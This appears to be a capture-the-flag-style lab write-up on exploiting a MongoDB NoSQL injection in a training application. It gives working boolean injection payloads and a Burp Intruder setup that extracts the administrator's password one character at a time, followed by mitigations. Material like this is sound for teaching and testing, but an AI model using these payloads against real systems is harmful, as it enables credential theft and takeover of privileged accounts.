# Lab 03 – Exploiting NoSQL Injection to Extract Data

## Lab Overview

**Objective**

Exploit a NoSQL injection vulnerability in the user lookup functionality to extract the administrator user's password and log in as the administrator.

The application uses a MongoDB database and evaluates injected JavaScript expressions.

---

# Vulnerability

The user lookup functionality incorporates user-controlled input into a MongoDB query.

Because the input is not properly sanitized, JavaScript expressions can be injected and evaluated by the database.

---

# Reconnaissance

1. Log in using:

```text
wiener:peter
```

2. Open **Burp Suite**.
3. Locate the request:

```text
GET /user/lookup?user=wiener
```

4. Send the request to **Repeater**.

---

# Exploitation

### Step 1 – Trigger a Syntax Error

Replace the user value with:

```text
'
```

A server error indicates that user input affects the MongoDB query.

---

### Step 2 – Confirm Injection

Submit:

```text
wiener'+'
```

URL-encode the payload.

The application successfully retrieves the **wiener** account, confirming server-side injection.

---

### Step 3 – Test Boolean Conditions

False condition:

```text
wiener' && '1'=='2
```

Response:

```text
Could not find user
```

---

True condition:

```text
wiener' && '1'=='1
```

The account details are returned.

This confirms that injected boolean expressions influence the query.

---

### Step 4 – Determine Password Length

Submit:

```text
administrator' && this.password.length < 30 || 'a'=='b
```

Reduce the value until the condition changes.

The PortSwigger solution determines that the administrator password length is:

```text
8
```

---

### Step 5 – Enumerate the Password

Send the request to **Intruder**.

Use the payload:

```text
administrator' && this.password[§0§]=='§a§
```

Configure:

- **Cluster Bomb**
- Position 1 → Numbers **0–7**
- Position 2 → Lowercase letters **a–z**

Sort the responses by **Length** to identify successful matches.

Combine the discovered characters to recover the administrator password.

---

### Step 6 – Log In

Authenticate as the administrator using the extracted password.

---

# Successful Result

The administrator password is recovered and the administrator account is successfully accessed.

---

# Why It Works

Injected JavaScript expressions evaluate boolean conditions against the password field.

By testing one character at a time, the password can be extracted without directly displaying it.

---

# Impact

Successful exploitation allows attackers to recover sensitive credentials and compromise privileged accounts.

---

# Mitigation

- Validate user input.
- Prevent JavaScript execution inside database queries.
- Use parameterized queries.

---

# Bug Bounty Methodology

1. Identify the injection point.
2. Confirm syntax injection.
3. Test boolean conditions.
4. Determine password length.
5. Enumerate characters.
6. Authenticate using the recovered password.

---

# Key Learnings

- Boolean conditions enable blind data extraction.
- Character-by-character enumeration is effective when direct output is unavailable.
- Burp Intruder simplifies automated extraction.